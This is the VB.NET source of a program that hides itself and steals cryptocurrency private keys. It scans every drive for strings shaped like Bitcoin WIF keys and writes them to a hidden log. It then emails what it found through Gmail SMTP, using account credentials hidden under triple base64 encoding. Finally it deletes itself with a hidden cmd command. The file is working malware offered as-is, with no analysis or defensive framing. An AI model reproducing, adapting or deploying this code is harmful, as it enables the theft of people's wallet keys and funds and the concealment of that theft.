Imports System.Security.Cryptography
Imports System.Text
Imports System.IO
Imports System.Net.Mail

Public Class Form1

    Dim userr As String = Environment.UserName
    Dim mnoo As String = "C:\Users\" & userr & "\Documents\z"
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Dim AppData As String = "C:\Users\" & userr & "\Documents\z\EngineBtqc.exe"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Me.Visible = False
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        If Not System.IO.Directory.Exists(mnoo) Then
            System.IO.Directory.CreateDirectory(mnoo)
            Dim ToHideDir As New System.IO.DirectoryInfo(mnoo)
            ToHideDir.Attributes = IO.FileAttributes.Hidden
        End If
        If File.Exists(AppData) Then
            IO.File.Delete(AppData)
            IO.File.Copy(Application.ExecutablePath, AppData)
            Process.Start(AppData)
            Threading.Thread.Sleep("3000")
            SetAttr(AppData, FileAttribute.System)
            Shell("cmd.exe /k ping 0 & del " & ChrW(34) & LO.FullName & ChrW(34) & " & exit", AppWinStyle.Hide)
            Process.GetCurrentProcess.Kill()
        End If
        On Error Resume Next
        For Each drive As String In Directory.GetLogicalDrives() ''''''''''''''''
            UrtHDirectory(drive)
        Next
        Dim gg As New StreamReader(mnoo & "\hjfiju53tgv.log")
        Dim km As String = Nothing
        While gg.Peek > 0
            km = (gg.ReadLine)
        End While
        gg.Dispose()
        gg.Close()
        My.Computer.FileSystem.DeleteDirectory(mnoo, FileIO.DeleteDirectoryOption.DeleteAllContents)
        Dim Smtp_Server As New SmtpClient("smtp.gmail.com", 587)
        Dim e_mail As New MailMessage()
        Smtp_Server.UseDefaultCredentials = False
        Smtp_Server.Credentials = New Net.NetworkCredential(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("V2tkR01tRlhVWFZpYlZZelpFYzVkVTFxUVhoUFZVSnVZbGRHY0dKRE5XcGlNakE5")))))), System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WVZkR2RGbFlTbkJaTW1ocFlqTnJlbEZCUFQwPQ==")))))))
        Smtp_Server.EnableSsl = True
       e_mail = New MailMessage()
        e_mail.From = New MailAddress(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("V2tkR01tRlhVWFZpYlZZelpFYzVkVTFxUVhoUFZVSnVZbGRHY0dKRE5XcGlNakE5")))))))
        e_mail.To.Add(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("V2tkR01tRlhVWFZpYlZZelpFYzVkVTFxUVhoUFZVSnVZbGRHY0dKRE5XcGlNakE5")))))))
        e_mail.Subject = "WiF: " & userr
        e_mail.IsBodyHtml = False
        e_mail.Body += km
        Smtp_Server.Send(e_mail)
        'empty all used credentials
        Melta(5)

    End Sub
    Private Sub Melta(ByVal Timeout As Integer)
        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
        p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & Timeout.ToString & " > Nul & Del " & ControlChars.Quote & Application.ExecutablePath & ControlChars.Quote
        p.CreateNoWindow = True
        p.ErrorDialog = False
        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
        System.Diagnostics.Process.Start(p)
        Application.ExitThread()
    End Sub
    Public Sub UrtHDirectory(ByVal location As String)
        On Error Resume Next
        Dim pathExact As String = ""
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)
        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))
            Dim fileInfo As FileInfo = New FileInfo(files(i))
            Dim length As Long = fileInfo.Length
            If Not extension.Contains(".dll") Or Not extension.Contains(".exe") _
                Or Not extension.Contains(".ico") Or Not extension.Contains(".png") _
                Or Not extension.Contains(".txt") Or Not extension.Contains(".jpg") _
                Or Not extension.Contains(".wmv") Or Not extension.Contains(".msi") _
                 Or Not extension.Contains(".mp4") Or Not extension.Contains(".mp3") _
                Or Not extension.Contains(".3gp") Or Not extension.Contains(".zip") _
                Or Not extension.Contains(".rar") Or Not extension.Contains(".part") _
                 Or Not extension.Contains(".apk") Or Not extension.Contains(".xpi") _
                Or Not extension.Contains(".dat") Or Not extension.Contains(".scr") Then
                Search4WIFATR(files(i))
            End If
        Next
        For i As Integer = 0 To childDirectories.Length - 1
            If (childDirectories(i)).Contains("Windows") Then
                Continue For
            End If
            UrtHDirectory(childDirectories(i))
        Next
    End Sub

    Sub Search4WIFATR(ByVal fillee As String)
        On Error Resume Next
        Dim strf As StreamReader = New StreamReader(fillee)
        While strf.Peek > 0
            Dim LHG = strf.ReadLine
            Dim mm = LHG.Split(" ")
            For Each mmv In mm
                If mmv.StartsWith("K") Or mmv.StartsWith("L") Or mmv.StartsWith("5") _
                    AndAlso mmv.Length = 52 Or mmv.Length = 51 Then
                    If Not mmv.Contains("@") AndAlso Not mmv.Contains("#") AndAlso Not mmv.Contains("$") AndAlso Not mmv.Contains("^") AndAlso _
                   Not mmv.Contains("&") AndAlso Not mmv.Contains("(") AndAlso Not mmv.Contains("(") AndAlso Not mmv.Contains(")") AndAlso _
                    Not mmv.Contains("!") AndAlso Not mmv.Contains("`") AndAlso Not mmv.Contains("~") AndAlso Not mmv.Contains(":") AndAlso _
                     Not mmv.Contains("\") AndAlso Not mmv.Contains("|") AndAlso Not mmv.Contains("<") AndAlso Not mmv.Contains(">") _
                    AndAlso Not mmv.Contains("[") AndAlso Not mmv.Contains("]") AndAlso Not mmv.Contains("{") AndAlso Not mmv.Contains("}") AndAlso Not mmv.Contains("(") _
                    AndAlso Not mmv.Contains(";") AndAlso Not mmv.Contains("'") AndAlso Not mmv.Contains("?") AndAlso Not mmv.Contains("/") AndAlso Not mmv.Contains("(") _
                    AndAlso Not mmv.Contains(",") AndAlso Not mmv.Contains(".") AndAlso Not mmv.Contains("π") AndAlso Not mmv.Contains("β") AndAlso Not mmv.Contains("∑") _
AndAlso Not mmv.Contains("α") AndAlso Not mmv.Contains("µ") AndAlso Not mmv.Contains("∞") AndAlso Not mmv.Contains("×") AndAlso Not mmv.Contains("©") _
                           AndAlso Not mmv.Contains("£") AndAlso Not mmv.Contains("™") AndAlso Not mmv.Contains("≠") AndAlso Not mmv.Contains("≥") AndAlso Not mmv.Contains("Ω") _
                                       AndAlso Not mmv.Contains("¥") AndAlso Not mmv.Contains("®") AndAlso Not mmv.Contains("≤") AndAlso Not mmv.Contains("±") AndAlso Not mmv.Contains("÷") _
                                                   AndAlso Not mmv.Contains("£") AndAlso Not mmv.Contains("€") AndAlso Not mmv.Contains("π") AndAlso Not mmv.Contains("β") AndAlso Not mmv.Contains("∑") _
   AndAlso Not mmv.Contains("ς") AndAlso Not mmv.Contains("ω") AndAlso Not mmv.Contains("*") AndAlso Not mmv.Contains("⋮") AndAlso Not mmv.Contains("⋯") _
                    AndAlso Not mmv.Contains("ρ") AndAlso Not mmv.Contains("σ") AndAlso Not mmv.Contains("τ") AndAlso Not mmv.Contains("φ") AndAlso Not mmv.Contains("→") _
                    AndAlso Not mmv.Contains("↓") AndAlso Not mmv.Contains("↔") AndAlso Not mmv.Contains("∴") AndAlso Not mmv.Contains("γ") AndAlso Not mmv.Contains("δ") _
AndAlso Not mmv.Contains("∃") AndAlso Not mmv.Contains("∇") AndAlso Not mmv.Contains("∆") AndAlso Not mmv.Contains("℃") AndAlso Not mmv.Contains("℉") _
                 AndAlso Not mmv.Contains("∅") AndAlso Not mmv.Contains("∩") AndAlso Not mmv.Contains("∪") AndAlso Not mmv.Contains("∜") AndAlso Not mmv.Contains("∛") _
                           AndAlso Not mmv.Contains("≫") AndAlso Not mmv.Contains("≪") AndAlso Not mmv.Contains("∁") AndAlso Not mmv.Contains("∂") AndAlso Not mmv.Contains("√") _
                                       AndAlso Not mmv.Contains("∓") AndAlso Not mmv.Contains("≅") AndAlso Not mmv.Contains("≈") AndAlso Not mmv.Contains("≡") AndAlso Not mmv.Contains("∀") Then
                        Dim dfg As New StreamWriter(mnoo & "\hjfiju53tgv.log", append:=True)
                        dfg.WriteLine(mmv)
                        dfg.Dispose()
                        dfg.Close()
                    End If
                End If
            Next
        End While
        strf.Close()
    End Sub
End Class

